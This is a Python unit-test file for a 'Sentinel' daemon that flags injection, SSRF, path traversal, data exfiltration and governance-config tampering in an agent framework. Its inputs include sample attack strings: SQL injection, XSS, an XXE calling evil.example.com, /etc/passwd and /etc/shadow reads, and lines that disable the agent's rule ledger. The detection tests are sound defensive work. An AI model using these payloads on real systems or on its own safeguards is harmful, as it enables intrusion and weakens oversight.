"""
tests/test_sentinel.py — Unit tests for the Sentinel Daemon.

Tests anomaly detection: privilege escalation, injection scanning,
gas spike detection, ALIGN violation checking, alerts, and lifecycle.
"""

from __future__ import annotations

import pytest
from unittest.mock import MagicMock

from agents.core.daemons import DaemonEventBus, DaemonStatus
from agents.core.daemons.sentinel import (
    AlertSeverity,
    SentinelAlert,
    SentinelDaemon,
)

# ─── Fixtures ────────────────────────────────────────────────────────────────


@pytest.fixture
def daemon():
    """Create a fresh SentinelDaemon."""
    return SentinelDaemon(gas_spike_threshold=3.0)


@pytest.fixture
def running_daemon():
    """Create a started SentinelDaemon."""
    d = SentinelDaemon(gas_spike_threshold=3.0)
    d.start()
    return d


@pytest.fixture
def daemon_with_bus():
    """Create a SentinelDaemon wired to a DaemonEventBus."""
    bus = DaemonEventBus()
    d = SentinelDaemon(event_bus=bus)
    d.start()
    return d, bus


# ─── Lifecycle Tests ─────────────────────────────────────────────────────────


class TestLifecycle:
    """Tests for daemon start/stop behavior."""

    def test_initial_status_stopped(self, daemon):
        assert daemon.status == DaemonStatus.STOPPED

    def test_start_sets_running(self, daemon):
        daemon.start()
        assert daemon.status == DaemonStatus.RUNNING

    def test_stop_sets_stopped(self, running_daemon):
        running_daemon.stop()
        assert running_daemon.status == DaemonStatus.STOPPED

    def test_disabled_daemon_stays_stopped(self):
        d = SentinelDaemon(enabled=False)
        d.start()
        assert d.status == DaemonStatus.STOPPED

    def test_check_while_stopped_returns_empty(self, daemon):
        alerts = daemon.check({"type": "test"})
        assert alerts == []


# ─── Privilege Escalation Tests ──────────────────────────────────────────────


class TestPrivilegeEscalation:
    """Tests for tier boundary violation detection."""

    def test_hearth_accessing_forge_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({
            "tier": "hearth",
            "required_tier": "forge",
            "source": "agent_x",
        })
        assert len(alerts) == 1
        assert alerts[0].pattern == "privilege_escalation"
        assert alerts[0].severity == AlertSeverity.CRITICAL

    def test_hearth_accessing_sovereign_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({
            "tier": "hearth",
            "required_tier": "sovereign",
        })
        assert len(alerts) == 1
        assert alerts[0].evidence["event_tier"] == "hearth"
        assert alerts[0].evidence["required_tier"] == "sovereign"

    def test_forge_accessing_hearth_no_alert(self, running_daemon):
        alerts = running_daemon.check({
            "tier": "forge",
            "required_tier": "hearth",
        })
        escalation_alerts = [a for a in alerts if a.pattern == "privilege_escalation"]
        assert len(escalation_alerts) == 0

    def test_same_tier_no_alert(self, running_daemon):
        alerts = running_daemon.check({
            "tier": "forge",
            "required_tier": "forge",
        })
        escalation_alerts = [a for a in alerts if a.pattern == "privilege_escalation"]
        assert len(escalation_alerts) == 0

    def test_no_tier_info_no_alert(self, running_daemon):
        alerts = running_daemon.check({"type": "harmless"})
        escalation_alerts = [a for a in alerts if a.pattern == "privilege_escalation"]
        assert len(escalation_alerts) == 0

    def test_escalation_has_recommendation(self, running_daemon):
        alerts = running_daemon.check({
            "tier": "hearth",
            "required_tier": "sovereign",
        })
        assert "sovereign" in alerts[0].recommendation


# ─── Injection Detection Tests ───────────────────────────────────────────────


class TestInjectionDetection:
    """Tests for injection signature scanning."""

    def test_eval_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": 'eval("malicious_code")'})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1
        assert injection_alerts[0].severity == AlertSeverity.CRITICAL

    def test_exec_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": 'exec("os.remove(\"/\")")'})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1

    def test_import_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": "__import__('os')"})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1

    def test_sql_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": "'; DROP TABLE users"})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1

    def test_xss_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": '<script>alert("xss")</script>'})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1

    def test_template_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": "{{config.__class__}}"})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1

    def test_safe_payload_no_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "normal hello world text"})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 0

    def test_injection_evidence_contains_match(self, running_daemon):
        alerts = running_daemon.check({"payload": 'eval("hack")'})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert "matched" in injection_alerts[0].evidence


# ─── Gas Anomaly Tests ───────────────────────────────────────────────────────


class TestGasAnomaly:
    """Tests for statistical gas spike detection."""

    def test_needs_baseline_before_detection(self, running_daemon):
        """First 5 events build baseline — no alerts."""
        for i in range(5):
            alerts = running_daemon.check({"gas_used": 10})
            gas_alerts = [a for a in alerts if a.pattern == "gas_spike"]
            assert len(gas_alerts) == 0

    def test_spike_triggers_after_baseline(self, running_daemon):
        """Massive spike after baseline should trigger alert."""
        for _ in range(5):
            running_daemon.check({"gas_used": 10})
        alerts = running_daemon.check({"gas_used": 1000})
        gas_alerts = [a for a in alerts if a.pattern == "gas_spike"]
        assert len(gas_alerts) == 1
        assert gas_alerts[0].severity == AlertSeverity.WARNING

    def test_normal_gas_no_alert(self, running_daemon):
        """Consistent gas usage should not trigger."""
        for _ in range(10):
            alerts = running_daemon.check({"gas_used": 10})
        gas_alerts = [a for a in alerts if a.pattern == "gas_spike"]
        assert len(gas_alerts) == 0

    def test_no_gas_in_event_no_alert(self, running_daemon):
        alerts = running_daemon.check({"type": "no_gas_event"})
        gas_alerts = [a for a in alerts if a.pattern == "gas_spike"]
        assert len(gas_alerts) == 0

    def test_spike_evidence_contains_stats(self, running_daemon):
        for _ in range(5):
            running_daemon.check({"gas_used": 10})
        alerts = running_daemon.check({"gas_used": 500})
        gas_alerts = [a for a in alerts if a.pattern == "gas_spike"]
        assert "mean" in gas_alerts[0].evidence
        assert "threshold" in gas_alerts[0].evidence


# ─── ALIGN Violation Tests ───────────────────────────────────────────────────


class TestAlignViolation:
    """Tests for ALIGN_LEDGER rule violation detection."""

    def test_violation_detected(self, running_daemon):
        alerts = running_daemon.check({
            "align_violation": {"rule": "R-004", "details": "data exposure"},
        })
        align_alerts = [a for a in alerts if a.pattern == "align_violation"]
        assert len(align_alerts) == 1
        assert align_alerts[0].severity == AlertSeverity.WARNING

    def test_no_violation_no_alert(self, running_daemon):
        alerts = running_daemon.check({"type": "normal_event"})
        align_alerts = [a for a in alerts if a.pattern == "align_violation"]
        assert len(align_alerts) == 0

    def test_violation_recommendation_contains_rule(self, running_daemon):
        alerts = running_daemon.check({
            "align_violation": {"rule": "R-007"},
        })
        assert "R-007" in alerts[0].recommendation


# ─── Alert & Stats Tests ────────────────────────────────────────────────────


class TestAlertsAndStats:
    """Tests for alert retrieval and statistics."""

    def test_get_alerts_empty_initially(self, running_daemon):
        assert running_daemon.get_alerts() == []

    def test_get_alerts_accumulates(self, running_daemon):
        running_daemon.check({"payload": 'eval("x")'})
        running_daemon.check({"tier": "hearth", "required_tier": "sovereign"})
        assert len(running_daemon.get_alerts()) == 2

    def test_get_alerts_filter_by_severity(self, running_daemon):
        running_daemon.check({"payload": 'eval("x")'})  # CRITICAL
        running_daemon.check({"align_violation": {"rule": "R-004"}})  # WARNING
        critical = running_daemon.get_alerts(severity=AlertSeverity.CRITICAL)
        warning = running_daemon.get_alerts(severity=AlertSeverity.WARNING)
        assert len(critical) == 1
        assert len(warning) == 1

    def test_get_stats_structure(self, running_daemon):
        running_daemon.check({"type": "event1"})
        stats = running_daemon.get_stats()
        assert "status" in stats
        assert "check_count" in stats
        assert "total_alerts" in stats
        assert "critical_alerts" in stats
        assert stats["check_count"] == 1

    def test_check_count_increments(self, running_daemon):
        running_daemon.check({"type": "a"})
        running_daemon.check({"type": "b"})
        assert running_daemon.get_stats()["check_count"] == 2


# ─── Event Bus Integration ──────────────────────────────────────────────────


class TestEventBusIntegration:
    """Tests for DaemonEventBus alert emission."""

    def test_alert_emitted_to_bus(self, daemon_with_bus):
        daemon, bus = daemon_with_bus
        received = []
        bus.subscribe(lambda e: received.append(e))

        daemon.check({"payload": 'eval("x")'})
        assert len(received) == 1
        assert received[0].source == "sentinel"
        assert received[0].event_type == "alert"
        assert received[0].severity == "critical"

    def test_no_alert_no_emission(self, daemon_with_bus):
        daemon, bus = daemon_with_bus
        received = []
        bus.subscribe(lambda e: received.append(e))

        daemon.check({"type": "safe_event"})
        assert len(received) == 0


# ─── High Severity Tests ────────────────────────────────────────────────────


class TestHighSeverity:
    """Tests for the HIGH severity level."""

    def test_high_severity_exists(self):
        assert AlertSeverity.HIGH.value == "high"

    def test_high_severity_filter(self, running_daemon):
        """Data exfiltration alert (HIGH) is filterable by severity."""
        running_daemon.check({"payload": "private_key: AAABBBCCC"})
        high_alerts = running_daemon.get_alerts(severity=AlertSeverity.HIGH)
        # At least one HIGH alert should be present
        assert len(high_alerts) >= 1

    def test_high_stats_tracked(self, running_daemon):
        """get_stats() reports high_alerts count."""
        running_daemon.check({"payload": "private_key: AAABBBCCC"})
        stats = running_daemon.get_stats()
        assert "high_alerts" in stats
        assert stats["high_alerts"] >= 1

    @pytest.fixture
    def running_daemon(self):
        d = SentinelDaemon(gas_spike_threshold=3.0)
        d.start()
        return d


# ─── Data Exfiltration Tests ─────────────────────────────────────────────────


class TestDataExfiltration:
    """Tests for data exfiltration pattern detection."""

    @pytest.fixture
    def running_daemon(self):
        d = SentinelDaemon()
        d.start()
        return d

    def test_large_base64_triggers_alert(self, running_daemon):
        big_b64 = "A" * 100  # 100 chars — over the 80-char threshold
        alerts = running_daemon.check({"payload": big_b64})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert len(exfil_alerts) == 1
        assert exfil_alerts[0].severity == AlertSeverity.HIGH

    def test_embedded_private_key_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "private_key: mysecretvalue1234"})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert len(exfil_alerts) >= 1

    def test_ssn_pattern_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "user SSN: 123-45-6789"})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert len(exfil_alerts) == 1

    def test_credit_card_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "card 4111 1111 1111 1111"})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert len(exfil_alerts) == 1

    def test_safe_payload_no_exfil_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "normal operation log entry"})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert len(exfil_alerts) == 0

    def test_exfil_evidence_contains_match(self, running_daemon):
        alerts = running_daemon.check({"payload": "user SSN: 123-45-6789"})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert "matched" in exfil_alerts[0].evidence

    def test_exfil_has_recommendation(self, running_daemon):
        alerts = running_daemon.check({"payload": "user SSN: 123-45-6789"})
        exfil_alerts = [a for a in alerts if a.pattern == "data_exfiltration"]
        assert exfil_alerts[0].recommendation != ""


# ─── Config Tampering Tests ──────────────────────────────────────────────────


class TestConfigTampering:
    """Tests for governance config tampering detection."""

    @pytest.fixture
    def running_daemon(self):
        d = SentinelDaemon()
        d.start()
        return d

    def test_align_ledger_reference_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "open('governance/ALIGN_LEDGER.yaml', 'w')"})
        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
        assert len(tamper_alerts) >= 1
        assert tamper_alerts[0].severity == AlertSeverity.CRITICAL

    def test_sentinel_gate_reference_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "edit sentinel_gate.py and disable rules"})
        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
        assert len(tamper_alerts) >= 1

    def test_compiled_rules_overwrite_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "_compiled_rules = []"})
        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
        assert len(tamper_alerts) >= 1

    def test_safe_payload_no_tamper_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "query the database for results"})
        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
        assert len(tamper_alerts) == 0

    def test_tamper_alert_has_recommendation(self, running_daemon):
        alerts = running_daemon.check({"payload": "_load_ledger()"})
        tamper_alerts = [a for a in alerts if a.pattern == "config_tampering"]
        assert len(tamper_alerts) >= 1
        assert "human approval" in tamper_alerts[0].recommendation.lower()


# ─── SSRF / Path Traversal Tests ─────────────────────────────────────────────


class TestSSRFAndPathTraversal:
    """Tests for SSRF and path traversal detection."""

    @pytest.fixture
    def running_daemon(self):
        d = SentinelDaemon()
        d.start()
        return d

    def test_localhost_ssrf_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "http://localhost:8080/admin"})
        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
        assert len(ssrf_alerts) == 1
        assert ssrf_alerts[0].severity == AlertSeverity.HIGH

    def test_internal_ip_ssrf_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "http://192.168.1.1/secret"})
        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
        assert len(ssrf_alerts) == 1

    def test_file_uri_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "file:///etc/passwd"})
        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
        assert len(ssrf_alerts) == 1

    def test_path_traversal_triggers_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "../../etc/shadow"})
        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
        assert len(ssrf_alerts) == 1

    def test_safe_external_url_no_alert(self, running_daemon):
        alerts = running_daemon.check({"payload": "https://api.example.com/data"})
        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
        assert len(ssrf_alerts) == 0

    def test_ssrf_evidence_contains_match(self, running_daemon):
        alerts = running_daemon.check({"payload": "http://127.0.0.1/internal"})
        ssrf_alerts = [a for a in alerts if a.pattern == "ssrf_or_path_traversal"]
        assert len(ssrf_alerts) == 1
        assert "matched" in ssrf_alerts[0].evidence


# ─── ClearAlerts Tests ───────────────────────────────────────────────────────


class TestClearAlerts:
    """Tests for the clear_alerts() utility."""

    @pytest.fixture
    def running_daemon(self):
        d = SentinelDaemon()
        d.start()
        return d

    def test_clear_alerts_returns_count(self, running_daemon):
        running_daemon.check({"payload": 'eval("x")'})
        running_daemon.check({"tier": "hearth", "required_tier": "sovereign"})
        count = running_daemon.clear_alerts()
        assert count == 2

    def test_clear_alerts_empties_list(self, running_daemon):
        running_daemon.check({"payload": 'eval("x")'})
        running_daemon.clear_alerts()
        assert running_daemon.get_alerts() == []

    def test_clear_alerts_on_empty_returns_zero(self, running_daemon):
        assert running_daemon.clear_alerts() == 0

    def test_check_count_preserved_after_clear(self, running_daemon):
        running_daemon.check({"type": "a"})
        running_daemon.check({"type": "b"})
        running_daemon.clear_alerts()
        assert running_daemon.get_stats()["check_count"] == 2


# ─── Extended Injection Tests ────────────────────────────────────────────────


class TestExtendedInjectionPatterns:
    """Tests for new injection patterns added to the sentinel daemon."""

    @pytest.fixture
    def running_daemon(self):
        d = SentinelDaemon()
        d.start()
        return d

    def test_xxe_injection_detected(self, running_daemon):
        # Use ENTITY-style XXE without file:// to isolate injection detection
        alerts = running_daemon.check({"payload": '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.example.com/xxe.dtd">'})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) >= 1

    def test_sql_union_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": "' UNION SELECT username, password FROM users--"})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1

    def test_javascript_protocol_injection_detected(self, running_daemon):
        alerts = running_daemon.check({"payload": "javascript: alert(1)"})
        injection_alerts = [a for a in alerts if a.pattern == "injection_detected"]
        assert len(injection_alerts) == 1
